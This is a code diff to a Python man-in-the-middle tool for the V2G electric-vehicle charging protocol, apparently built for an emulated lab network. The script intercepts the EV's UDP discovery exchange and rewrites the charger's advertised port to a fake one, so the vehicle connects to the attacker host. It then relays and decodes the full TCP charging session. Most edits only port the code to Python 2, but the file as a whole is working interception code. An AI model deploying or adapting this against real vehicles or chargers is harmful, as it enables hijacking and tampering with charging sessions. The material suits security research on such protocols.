@@ -2,8 +2,10 @@ import socket
 from v2g_client import TCPClient, TCPServer
 from binascii import hexlify
 import requests
+import sys
+import struct
 
-class V2GTPMessage:
+class V2GTPMessage(object):
     '''
     Constructs a V2G Transfer Protocol message containing the header 
     (which consists of the protocol version, the inverse protocol version, 
@@ -22,6 +24,7 @@ class V2GTPMessage:
         self.payload = data[8:]
         print("EXI:", hexlify(self.payload))
 
+    # Use V2GDecoder to decode the exi.
     def decode_payload_exi(self):
         r = requests.post("http://localhost:9000", headers={"Format":"EXI"}, data=hexlify(self.payload))
         return r.text
@@ -36,9 +39,14 @@ class SECCDiscoveryRes(V2GTPMessage):
         data: raw data bytes as input.
         '''
 
-        super().__init__(data)
+        super(SECCDiscoveryRes, self).__init__(data)
         self.secc_ip_address = self.payload[:16]
-        self.secc_port = int.from_bytes(self.payload[16:18],byteorder='big')
+        secc_port = struct.unpack("BB",self.payload[16:18])
+        self.secc_port = secc_port[0] << 8 | secc_port[1]
+        # if (sys.version_info.major == 3):
+        #     self.secc_port = int.from_bytes(self.payload[16:18],byteorder='big')
+        # else:
+        #     self.secc_port = int(self.payload[16:18].encode('hex'),16)
         self.set_security = self.payload[18:19] # [0]
         self.set_transport_protocol = self.payload[19:20] # [0]
      
@@ -49,7 +57,7 @@ class SECCDiscoveryRes(V2GTPMessage):
         secc_port = port
         # alter payload
         payload = bytearray(self.payload)
-        payload[16:18] = (secc_port).to_bytes(2,byteorder='big')
+        payload[16:18] = struct.pack("BB",port >> 8, port & 0xff)
         # alter data
         data = bytearray(self.data)
         data[8:] = payload
@@ -85,40 +93,48 @@ if __name__ == "__main__":
     # d) UDP: mim:15119(->8)  -> ev1
 
     upd_communication_finished = False
-    with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
-        print('Waiting for UDP message from ev to se on port %s, changed by flow to %d' % (V2G_UDP_SDP_SERVER_PORT, MOD_UDP_SDP_SERVER_PORT))
-        s.bind(('',MOD_UDP_SDP_SERVER_PORT))
+
+    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+
+    print('Waiting for UDP message from ev to se on port %s, changed by flow to %d' % (V2G_UDP_SDP_SERVER_PORT, MOD_UDP_SDP_SERVER_PORT))
+    s.bind(('',MOD_UDP_SDP_SERVER_PORT))
+    while not upd_communication_finished:
+        # a)
+        ev1_data, addr = s.recvfrom(72)
+        ev1_ip = addr[0]
+        udp_ev1_port = addr[1] # UDP port of ev1
+        print("EV->MIM %s:%s" % (ev1_ip, udp_ev1_port))
+        print("(len=%d) : %s" % (len(ev1_data), ev1_data))
+        
+        print('Waiting for UDP message from se to ev on port %s' % (udp_ev1_port))
+        # b)
+        (family, socktype, proto, canonname, se1_ip) = se_addrinfo[0]
+        print("MIM->SE (fw) %s:%d" % (se1_ip[0], V2G_UDP_SDP_SERVER_PORT))
+        s.sendto(ev1_data, se1_ip)
         while not upd_communication_finished:
-            # a)
-            ev1_data, addr = s.recvfrom(72)
-            ev1_ip = addr[0]
-            udp_ev1_port = addr[1] # UDP port of ev1
-            print("EV->MIM %s:%s" % (ev1_ip, udp_ev1_port))
-            print("(len=%d) : %s" % (len(ev1_data), ev1_data))
-            
-            print('Waiting for UDP message from se to ev on port %s' % (udp_ev1_port))
-            # b)
-            (family, socktype, proto, canonname, se1_ip) = se_addrinfo[0]
-            print("MIM->SE (fw) %s:%d" % (se1_ip[0], V2G_UDP_SDP_SERVER_PORT))
-            s.sendto(ev1_data, se1_ip)
-            while not upd_communication_finished:
-                # c)
-                se1_data, addr = s.recvfrom(90)
-                se1_ip = addr[0] # ip of se1
-                udp_se1_port = addr[1] # UDP port of se1
-                print("SE->MIM %s:%s" % (se1_ip, udp_se1_port))
-                print("(len=%d) : %s" % (len(se1_data), hexlify(se1_data)))
-                secc_udp_response = SECCDiscoveryRes(se1_data)
-                # alter port
-                altered_secc_udp_response = secc_udp_response.get_altered_data(port=SECC_FAKE_PORT)
-                print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
-                
-                # d)
-                print("MIM->EV (fw) %s:%s" % (ev1_ip, udp_ev1_port))
-                ev_addrinfo = socket.getaddrinfo('%s%s' % (ev1_ip, '%mim-eth0'), udp_ev1_port, socket.AF_INET6, socket.SOCK_DGRAM)
-                (family, socktype, proto, canonname, ev1_ip) = ev_addrinfo[0]
-                s.sendto(altered_secc_udp_response.data, ev1_ip)
-                upd_communication_finished = True
+            # c)
+            se1_data, addr = s.recvfrom(90)
+            se1_ip = addr[0] # ip of se1
+            udp_se1_port = addr[1] # UDP port of se1
+            print("SE->MIM %s:%s" % (se1_ip, udp_se1_port))
+            print("(len=%d) : %s" % (len(se1_data), hexlify(se1_data)))
+            secc_udp_response = SECCDiscoveryRes(se1_data)
+            # alter port
+            altered_secc_udp_response = secc_udp_response.get_altered_data(port=SECC_FAKE_PORT)
+            print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
+            # d)
+            print("MIM->EV (fw) %s:%s" % (ev1_ip, udp_ev1_port))
+            # print('%s%s' % (ev1_ip, '%mim-eth0'))
+            if ev1_ip.endswith('%mim-eth0'):
+                full_ev1_ip = ev1_ip
+            else:
+                full_ev1_ip = '%s%s' % (ev1_ip, '%mim-eth0')
+            ev_addrinfo = socket.getaddrinfo(full_ev1_ip, udp_ev1_port, socket.AF_INET6, socket.SOCK_DGRAM)
+            (family, socktype, proto, canonname, ev1_ip) = ev_addrinfo[0]
+            s.sendto(altered_secc_udp_response.data, ev1_ip)
+            upd_communication_finished = True
+
+    s.close()
     
     # TCP exchanges begin now
 
@@ -133,7 +149,11 @@ if __name__ == "__main__":
     # TCP: mim:SECC_FAKE_PORT   -> ev1:EVCC_PORT
 
     # TCP socket: connect mim to the server
-    se_addrinfo = socket.getaddrinfo('%s%s' % (se1_ip,'%mim-eth0'), secc_udp_response.secc_port, socket.AF_INET6, socket.SOCK_STREAM)
+    if se1_ip.endswith('%mim-eth0'):
+        full_se1_ip = se1_ip
+    else:
+        full_se1_ip = '%s%s' % (se1_ip, '%mim-eth0')
+    se_addrinfo = socket.getaddrinfo(full_se1_ip, secc_udp_response.secc_port, socket.AF_INET6, socket.SOCK_STREAM)
     
     se1 = TCPClient(se_addrinfo)
     se1.connect() # connect mim to se1    
@@ -141,28 +161,29 @@ if __name__ == "__main__":
     mim = TCPServer(SECC_FAKE_PORT)
     ev1_conn, addr = mim.accept() # waits for ev1 to connect
     print_count = 0
-    with ev1_conn:
-        print(addr, "has connected")
-        while ev1_data != b'':
-            ev1_data = ev1_conn.recv(1024)
-            try:
-                if print_count < 5:
-                    ev1_message = V2GTPMessage(ev1_data)
-                    print(ev1_message.decode_payload_exi())
-            except:
-                print('Not a V2GTPMessage')
-            se1.send(ev1_data)
-            se1_data = se1.get_response()
-            try:   
-                if print_count < 5:
-                    se1_message = V2GTPMessage(se1_data)
-                    print(se1_message.decode_payload_exi())
-            except:
-                print('Not a V2GTPMessage')
-            ev1_conn.send(se1_data)
+    
+    print(addr, "has connected")
+    while ev1_data != b'':
+        ev1_data = ev1_conn.recv(1024)
+        try:
+            if print_count < 5:
+                ev1_message = V2GTPMessage(ev1_data)
+                print(ev1_message.decode_payload_exi())
+        except:
+            print('Not a V2GTPMessage')
+        se1.send(ev1_data)
+        se1_data = se1.get_response()
+        try:   
+            if print_count < 5:
+                se1_message = V2GTPMessage(se1_data)
+                print(se1_message.decode_payload_exi())
+        except:
+            print('Not a V2GTPMessage')
+        ev1_conn.send(se1_data)
 
-            print_count += 1
+        print_count += 1
 
+    ev1_conn.close()
     
     mim.close()
     se1.close()
